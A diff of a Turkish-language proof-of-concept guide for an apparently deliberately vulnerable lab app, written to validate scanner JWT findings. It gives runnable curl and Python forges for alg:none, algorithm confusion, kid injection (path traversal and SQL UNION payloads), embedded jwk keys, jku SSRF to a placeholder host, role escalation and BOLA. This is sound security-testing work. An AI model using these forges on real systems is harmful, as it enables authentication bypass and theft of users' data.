@@ -22,10 +22,53 @@
 > alg:none/algorithm-confusion/kid/embedded/jku + exp/aud/iss-yok zafiyetleri **app genelinde**.
 > `controller/vulnJWTController.go` ve `routes/vuln_routes.go` **silindi**; mantık
 > `authController.Login` + `middlewares/authMiddleware.go` + `controller/userController.go`
-> (`GetAllUsersVuln`/`GetTenantUsersVuln`) içine taşındı. Ayrıntı ve canlı kanıt: Worker
-> `design_docs/JWT_DAST_FalsePositive_MasterPlan.md` §15.9. Aşağıdaki §1–§3 tarihsel referanstır;
+> (`GetAllUsersVuln`/`GetTenantUsersVuln`) içine taşındı. Ayrıntı, kök-neden ve canlı kanıt: Worker
+> `design_docs/Secman_JWT_Coverage_GapAnalysis.md` (not: MasterPlan'da atıfta bulunulan "§15.9"
+> yazılmamıştır — güncel kaynak Gap Analysis dokümanıdır). Aşağıdaki §1–§3 tarihsel referanstır;
 > zafiyet mantığı (`services/vulnjwt/verify.go` VULN-01..09) aynıdır, yalnız erişim yüzeyi ve giriş
 > noktası değişti.
+
+---
+
+## 0.0 Bunlar Neden GERÇEK Zafiyet, Neden False-Positive DEĞİL — 401/200 Mantığı
+
+> Bu bölümü konuyu hiç bilmeyen biri de yanlış anlamamalı. Aşağıdaki her PoC iki isteklik bir
+> **kontrollü deney**dir: bir **negative control** (kontrol grubu) ve bir **forge** (deney grubu).
+
+**Kurulum (izolasyon garantisi).** Sunucu, imzayı GERÇEKTEN doğrular. Bunu iki referansla ispatlıyoruz:
+
+- **Baseline** — gerçek RS256 imzalı token → **200** (normal erişim).
+- **Negative control** — aynı token ama imzanın son baytları bozuk → **401**.
+
+`200` (baseline) + `401` (bozuk imza) ikilisi tek başına şunu kanıtlar: **sunucu imza doğrulamasını
+AKTİF olarak yapıyor.** Yani rastgele/bozuk bir token içeri giremez.
+
+**Kanıt (forge).** Her zafiyet için, imzayı FARKLI bir kök nedenle atlayan bir forge token gönderiyoruz.
+Eğer o forge **200** dönüyorsa, sunucu "aktif olarak doğruladığı" imzayı **bu forge için atlamış**
+demektir. Bu, tanım gereği bir imza/doğrulama bypass'ıdır.
+
+**En sık yapılan yanlış okuma.** "401 gördüm, demek ki başarısız / zafiyet yok" — **YANLIŞ.**
+Bu deneyde **401 = pozitif değil, NEGATİF kanıttır** (kontrol grubu): sunucunun sağlam çalıştığını
+gösterir. Zafiyetin kanıtı **forge'un 200'ü**dür. Yani:
+
+| Gözlem | Anlamı |
+|---|---|
+| Baseline **200** | Erişim referansı |
+| Bozuk-imza control **401** | Sunucu imzayı doğruluyor (kontrol grubu — sağlıklı) |
+| Forge **200** | **ZAFİYET**: doğrulama bu forge tarafından atlandı (pozitif kanıt) |
+| Forge **401** | O forge işe yaramadı — bulgu YOK (false-positive üretilmez) |
+
+Bir forge'un 200 alması "sunucu her şeyi kabul ediyor" (auth yok) anlamına da GELMEZ: bunu control
+zaten eler — control 401 alıyorsa sunucu keyfî token kabul etmiyor, yalnız o SPESİFİK forge tekniği
+doğrulamayı deliyor. Bu ayrım her PoC'de "**Neden FP değil?**" başlığıyla tek tek yazılmıştır.
+
+**Kesinlik etiketleri.** Her PoC ya `KESİN (forge 200 gözlendi)` ya da
+`PASİF (yalnız decode; sunucu davranışı doğrulanmadı)` olarak işaretlidir. Pasif olan abartılmaz.
+
+> **Anahtar rotasyonu uyarısı (tekrar-üretim için).** SecMan RSA anahtarını **her container
+> başlangıcında yeniden üretir** (`services/vulnjwt/keystore.go:InitKeys`). Bu nedenle aşağıdaki
+> curl akışları token'ı **canlı `login` + canlı `jwks.json`'dan türetir** — elle kopyalanmış eski
+> bir token restart sonrası 401 alır (bu bir zafiyet değil, beklenen davranıştır).
 
 ---
 
@@ -90,75 +133,167 @@ ID gerektirmez).
 
 ---
 
-## 3. PoC — Adım Adım Exploit
+## 3. PoC — Kopyala-Çalıştır (curl / python)
 
-### 3.0 Baseline + Negative Control (izolasyon kanıtı) — MERGE sonrası güncel
+> Tüm örnekler `http://localhost:8070` içindir. Seed login hesapları
+> `secman-target/99-lutenix-profiles.sql` ile gelir (admin id `7a1e5c2d-…5b6a`, user1 `…5b6b`,
+> user2 `…5b6c`; parolalar `SecmanAdmin!123` / `SecmanUser1!` / `SecmanUser2!`). Gerçek token
+> değerleri çıktı örneklerinde `<REDACTED>` ile maskelenmiştir; yapı korunmuştur.
+
+### 3.0 Bootstrap — Baseline (200) + Negative Control (401) = izolasyon kanıtı
 ```bash
-# 1) Saldırgan gerçek hesabıyla giriş yapar (email+parola) -> zafiyetli RS256 token
-TOK=$(curl -s localhost:8070/api/v1/users/login \
-      -H 'Content-Type: application/json' \
+B=http://localhost:8070
+
+# (1) Gerçek giriş -> zafiyetli RS256 token (kid=secman-baseline-2024, id/role/tenant_id taşır)
+TOK=$(curl -s $B/api/v1/users/login -H 'Content-Type: application/json' \
       -d '{"email":"secman-user1@lutenix.local","password":"SecmanUser1!"}' | jq -r .token)
+#   TOK = eyJhbGciOiJSUzI1NiIsImtpZCI6InNlY21hbi1iYXNlbGluZS0yMDI0Ii...<REDACTED>
 
-# 2) Baseline -> 200 (kendi profili)
-curl -s localhost:8070/api/v1/users/profile -H "Authorization: Bearer $TOK"
+# (2) BASELINE -> 200 (kendi profili)
+curl -s -o /dev/null -w "baseline      = %{http_code}\n" $B/api/v1/users/profile -H "Authorization: Bearer $TOK"
 
-# 3) Negative control: imzanın son 4 baytını boz -> 401
-curl -s -o /dev/null -w "%{http_code}\n" localhost:8070/api/v1/users/profile \
-     -H "Authorization: Bearer ${TOK%????}AAAA"
+# (3) NEGATIVE CONTROL -> imzanın son 4 baytını boz -> 401
+curl -s -o /dev/null -w "wrong-sig ctrl = %{http_code}\n" $B/api/v1/users/profile -H "Authorization: Bearer ${TOK%????}AAAA"
 ```
-`200` + `401` → sunucu imzayı gerçekten doğruluyor. Aşağıdaki her forge bu doğrulamayı atlar.
+Beklenen: `baseline = 200`, `wrong-sig ctrl = 401`. **Bu ikili, sunucunun imzayı AKTİF doğruladığını
+kanıtlar** (kontrol grubu sağlıklı). Aşağıdaki her forge bu 401'i 200'e çevirir = doğrulama atlandı.
 
-### 3.1 VULN-01 · alg:none
-Header `{"alg":"none"}`, imza boş, `sub` kurbana çekilir:
+Ortak python yardımcıları (aşağıdaki PoC'ler bunu kullanır):
+```python
+# forgelib.py — b64url + HS/none/RS imza yardımcıları
+import json,base64,hmac,hashlib
+def b64u(b): return base64.urlsafe_b64encode(b if isinstance(b,bytes) else b.encode()).rstrip(b"=").decode()
+def jwt_none(claims, header=None):
+    h=header or {"alg":"none","typ":"JWT"}
+    return b64u(json.dumps(h,separators=(',',':')))+"."+b64u(json.dumps(claims,separators=(',',':')))+"."
+def jwt_hs(claims, secret, header):
+    si=b64u(json.dumps(header,separators=(',',':')))+"."+b64u(json.dumps(claims,separators=(',',':')))
+    return si+"."+b64u(hmac.new(secret if isinstance(secret,bytes) else secret.encode(),si.encode(),hashlib.sha256).digest())
 ```
-eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload:sub=victim@secman.io>.
-```
-→ `/api/v1/vuln/profile` **200** + kurbanın PII'si (ssn/salary).
 
-### 3.2 VULN-03 · Algorithm Confusion (crAPI'de FALSE-POSITIVE idi)
+---
+
+### 3.1 VULN-01 · alg:none — `KESİN (forge 200 gözlendi)`
 ```bash
-# JWKS'ten public key'i al, PEM'e çevir, HMAC secret olarak kullan
-curl -s localhost:4040/.well-known/jwks.json          # n,e -> PEM
-# HS256 token = HMAC-SHA256(header.payload, <PEM public key bytes>)
+# id = user1 (geçerli UUID; middleware uuid.Parse(id) şart koşar), role admin'e çekilir
+FORGE=$(python -c 'import forgelib as f; print(f.jwt_none({"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","sub":"secman-user1@lutenix.local","role":"admin"}))')
+curl -s -o /dev/null -w "alg:none = %{http_code}\n" $B/api/v1/users/profile -H "Authorization: Bearer $FORGE"   # -> 200
 ```
-Header `{"alg":"HS256"}`, secret = RSA public key PEM baytları → **200**.
-`services/vulnjwt/verify.go:159` HS256 dalına düşer, `algConfusionSecrets()` (satır 200) PEM/DER/base64 varyantlarını dener.
+**Neden gerçek zafiyet, neden FP değil?** Bootstrap'ta bozuk imza **401** aldı → sunucu imzayı
+doğruluyor. Bu forge'da imza segmenti tamamen BOŞ (`alg:none`) ve yine **200** döndü → sunucu, aktif
+olarak doğruladığı imzayı `alg:none` gördüğünde atlıyor. Kaynak: `verify.go` `case EqualFold(alg,"none")`.
 
-### 3.3 VULN-04 · kid Injection (crAPI'de FALSE-POSITIVE idi)
+### 3.2 VULN-03 · Algorithm Confusion (RS→HS) — `KESİN (forge 200 gözlendi)`
+```python
+# forgelib + canlı jwks -> RSA public key baytları HMAC secret olarak
+import forgelib as f, json, base64, urllib.request
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+k=json.load(urllib.request.urlopen("http://localhost:8070/.well-known/jwks.json"))["keys"][0]
+d=lambda s: base64.urlsafe_b64decode(s+"="*(-len(s)%4))
+pub=rsa.RSAPublicNumbers(int.from_bytes(d(k["e"]),"big"),int.from_bytes(d(k["n"]),"big")).public_key()
+der=pub.public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
+claims={"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","role":"admin","tenant_id":"28480d43-b30b-45b6-b320-42288698e679"}
+tok=f.jwt_hs(claims, der, {"alg":"HS256","typ":"JWT"})   # NOT: kid YOK (kid varsa sunucu kid-dalına gider)
+print(tok)
 ```
-# 4a empty-key:  kid = "../../../dev/null"   -> anahtar = ""      (boş string ile HMAC imzala)
-# 4b SQLi:       kid = "x' UNION SELECT 'attacker_secret' --"     (secret = attacker_secret)
-# 4c kid-as-key: kid = "known-kid-value"      -> anahtar = kid değeri
+```bash
+curl -s -o /dev/null -w "algconf = %{http_code}\n" $B/api/v1/users/all -H "Authorization: Bearer $TOK"   # -> 200
 ```
-Üçü de → **200**. Kaynak: `services/vulnjwt/keystore.go:resolveKidKey` (92-118).
+**Neden FP değil?** Kullanılan HMAC secret'ı **herkese açık** RSA public key'in baytlarıdır — özel
+anahtar YOK. Bozuk-imza kontrolü 401 iken bu 200 → sunucu `alg` header'ını otoriter sayıp asimetrik
+anahtarı simetrik secret gibi kullanıyor (`verify.go` HS256 dalı + `algConfusionSecrets()`).
+> **Önemli tuzak:** Token'a `kid` KOYMAYIN — `verify.go`'da kid dalı HS256 confusion dalından ÖNCEdir;
+> kid varsa istek kid-türetme yoluna gider (VULN-04), confusion'ı test etmez. (Worker'ın
+> `algorithm_confusion` mutator'ı da bilerek kid'siz üretir.)
 
-### 3.4 VULN-05 · Embedded-Key Forgery (jwk)
-Saldırgan kendi RSA çiftini üretir, public key'i header'a `jwk` olarak gömer, **kendi private key'iyle** RS256 imzalar → `verify.go:129` gömülü anahtarla doğrular → **200**.
-
-### 3.5 VULN-06 · jku SSRF + Attacker Key (crAPI'de scanner BLIND-SPOT idi)
+### 3.3 VULN-04a/b/c · kid Injection — `KESİN (forge 200 gözlendi)`
+```python
+import forgelib as f
+claims={"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","role":"admin"}
+# 4a empty-key: kid path -> boş anahtar
+print(f.jwt_hs(claims, b"", {"alg":"HS256","kid":"../../../../dev/null"}))
+# 4b SQLi: UNION SELECT 'attacker_secret' -> secret = attacker_secret
+print(f.jwt_hs(claims, "attacker_secret", {"alg":"HS256","kid":"x' UNION SELECT 'attacker_secret'-- -"}))
+# 4c kid-as-key: store'da yoksa kid değeri anahtar olur
+print(f.jwt_hs(claims, "lutenix-kid", {"alg":"HS256","kid":"lutenix-kid"}))
 ```
-header.jku = "http://attacker-oob.example.com:9999/jwks.json"
+Üçü de `/api/v1/users/all` → **200**. **Neden FP değil?** Her varyantta saldırgan HMAC anahtarını
+KENDİSİ belirliyor (boş / SQLi sabiti / kid'in kendisi); sunucu bu anahtarla doğrulayıp kabul ediyor.
+Bozuk-imza kontrolü 401 iken bunlar 200 → `keystore.go:resolveKidKey` saldırgan-kontrollü anahtar üretiyor.
+
+### 3.4 VULN-05 · Embedded-Key Forgery (jwk / x5c) — `KESİN (forge 200 gözlendi)`
+```python
+import forgelib as f, json, base64
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import hashes, serialization
+priv=rsa.generate_private_key(public_exponent=65537,key_size=2048); pub=priv.public_key().public_numbers()
+b64u=lambda n: base64.urlsafe_b64encode(n.to_bytes((n.bit_length()+7)//8,"big")).rstrip(b"=").decode()
+jwk={"kty":"RSA","n":b64u(pub.n),"e":b64u(pub.e)}
+hdr={"alg":"RS256","jwk":jwk}                                   # doğrulama anahtarı token'ın İÇİNDE
+si=(f.b64u(json.dumps(hdr,separators=(',',':')))+"."+f.b64u(json.dumps({"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","role":"admin"},separators=(',',':'))))
+sig=priv.sign(si.encode(), padding.PKCS1v15(), hashes.SHA256())  # SALDIRGANIN özel anahtarı
+print(si+"."+base64.urlsafe_b64encode(sig).rstrip(b"=").decode())
 ```
-Sunucu bu URL'i **allow-list olmadan** fetch eder (`verify.go:264 fetchRSAFromJKU`):
-- OOB collaborator'da DNS/HTTP callback → **Blind SSRF** kanıtı.
-- Saldırgan kendi JWKS'ini sunarsa, kendi private key imzası kabul edilir → imza-bypass.
-`x5u` için `verify.go:281`.
+`/api/v1/users/all` → **200**. **Neden FP değil?** İmza tamamen geçerli — ama saldırganın ÜRETTİĞİ
+anahtar çiftiyle; sunucu doğrulama anahtarını token'ın kendi `jwk` header'ından alıyor (`verify.go`
+`case header["jwk"]`). Bozuk-imza kontrolü 401 iken bu 200 → gömülü-anahtara güven. (x5c için aynı
+mantık, self-signed sertifika ile.)
 
-### 3.6 VULN-07/08 · exp / aud / iss doğrulanmaz
-Geçerli RS256 imzalı ama `exp` geçmişte / `aud`,`iss` yanlış token → **200**.
-Doğrulayıcı imza sonrası hiçbir claim kontrolü yapmaz (`verify.go:189` notu).
+### 3.5 VULN-06 · jku / x5u SSRF + Attacker Key — `PASİF/OOB (out-of-band doğrulama gerekir)`
+```python
+import forgelib as f, json, base64
+# header.jku = saldırgan-kontrollü OOB URL; sunucu bunu allow-list olmadan fetch eder
+hdr={"alg":"RS256","jku":"http://<OOB-CANARY-HOST>/jwks.json"}
+# ... (attacker RSA ile imzalanır; §3.4'teki gibi)
+```
+Sunucu `verify.go:fetchRSAFromJKU` ile URL'i **allow-list olmadan** çeker → OOB collaborator'da
+DNS/HTTP callback = **blind SSRF**. **Kesinlik:** SSRF kanıtı callback'e bağlıdır (yanıt kodu değil);
+bir OOB collaborator olmadan `KESİN` işaretlenemez. Saldırgan kendi JWKS'ini sunarsa imza da kabul
+edilir (imza-bypass). `x5u` için `verify.go:fetchRSAFromX5U`.
 
-### 3.7 VULN-10 · Privilege Escalation
-`role` claim'ini `admin` yapıp yeniden imzala (alg:none / confusion / kid ile) →
-`/api/v1/vuln/admin` **200** + tüm kullanıcılar. Baseline (role=user) → 403. Kaynak: `controller/vulnJWTController.go:110`.
+### 3.6 VULN-07 (exp/nbf/iat) & VULN-08 (aud/iss) — `KESİN (forge 200 gözlendi)`
+Bu forge'lar **gerçek imza** taşımalı (izolasyon: alg:none, "claim doğrulanmıyor"u "imza
+doğrulanmıyor"dan ayıramaz). §3.2'deki confusion secret'ıyla (`der`) imzalayın:
+```python
+import forgelib as f, time
+base={"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","sub":"secman-user1@lutenix.local"}
+print(f.jwt_hs({**base,"exp":int(time.time())-3600}, der, {"alg":"HS256","typ":"JWT"}))          # VULN-07 süresi dolmuş
+print(f.jwt_hs({**base,"aud":"başka-servis","iss":"https://saldirgan"}, der, {"alg":"HS256"}))    # VULN-08 yanlış aud/iss
+```
+`/api/v1/users/profile` → **200**. **Neden FP değil?** Token GEÇERLİ imzalı (confusion secret'ı)
+ve bozuk-imza kontrolü 401 → sunucu imzayı doğruluyor; buna rağmen süresi geçmiş / yanlış aud/iss
+kabul ediliyor → imza-sonrası **hiçbir claim doğrulaması yok** (`verify.go` `default` sonrası not).
 
-### 3.8 VULN-12/13 · BOLA (subject / tenant confusion)
-- `sub=victim@secman.io` → `/profile` kurbanın ssn/salary'si (`vulnJWTController.go:97`).
-- `tenant_id=t-002` → `/tenant` kurban tenant'ın tüm kayıtları (`vulnJWTController.go:123`).
-Baseline'da (kendi sub/tenant) kurban verisi görünmez → gerçek BOLA, plain-BOLA değil.
+### 3.7 VULN-10 · Privilege Escalation (role claim) — `KESİN (forge 200 gözlendi)`
+```bash
+# alg:none + role=admin (harvest/confusion anahtarından bağımsız)
+FORGE=$(python -c 'import forgelib as f; print(f.jwt_none({"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","role":"admin"}))')
+curl -s -o /dev/null -w "priv-esc /users/all = %{http_code}\n" $B/api/v1/users/all -H "Authorization: Bearer $FORGE"  # -> 200
+```
+**Neden FP değil?** Baseline düşük-yetkili token yalnız kendi verisini görür; `role:admin`'e
+yükseltilmiş forge tüm kullanıcıları döndürüyor (yetki DELTA'sı). Bozuk-imza kontrolü 401 iken bu
+200 → sunucu yetki kararını token'ın `role` claim'inden alıyor (`userController` role kontrolü).
 
-### 3.9 VULN-16 · Passive Decode Audit
-Login token'ı decode edilince: `email` (PII) payload'da, `jti` yok, `exp-iat = 7 gün` (>24s aşırı ömür). Kaynak: `services/vulnjwt/sign.go:22,27,28`.
+### 3.8 VULN-12/13 · BOLA (subject / tenant confusion) — `KESİN (mekanizma), victim değeri gerekir`
+```bash
+# sub/id -> kurban; tenant_id -> kurban tenant
+python -c 'import forgelib as f; print(f.jwt_none({"id":"<VICTIM-UUID>","sub":"<VICTIM-EMAIL>","role":"user"}))'   # /users/profile -> kurban PII
+python -c 'import forgelib as f; print(f.jwt_none({"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","tenant_id":"<VICTIM-TENANT>"}))'  # /users/tenant -> kurban tenant
+```
+**Neden FP değil?** Kendi (baseline) token'ıyla kurban verisi GÖRÜNMEZ; yalnız `id/sub`/`tenant_id`
+kurbana çekilince görünür → gerçek BOLA (plain-BOLA değil). **Not:** worker tarafında canlı bulgu
+için kurban değerinin differential'dan gelmesi gerekir (`{{victim_id}}` carrier — bkz. Worker
+`design_docs/Secman_JWT_Coverage_GapAnalysis.md` F7).
+
+### 3.9 VULN-16 · Passive Decode Audit — `PASİF (yalnız decode; sunucu davranışı doğrulanmadı)`
+```bash
+echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
+#   -> {"email":"...","exp":..., "iat":...}  (jti YOK; exp-iat = 7 gün)
+```
+**Neden gerçek (ama pasif) bulgu?** Token imzalı ama şifresiz: PII (`email`) payload'da taşınıyor,
+`jti` yok (replay/revocation koruması yok), ömür 7 gün (aşırı). Bu tespit tek başına token'ın
+içeriğine dayanır — sunucuya forge gönderilmez, bu yüzden `KESİN` değil `PASİF` etiketlidir.
 
 ---
 
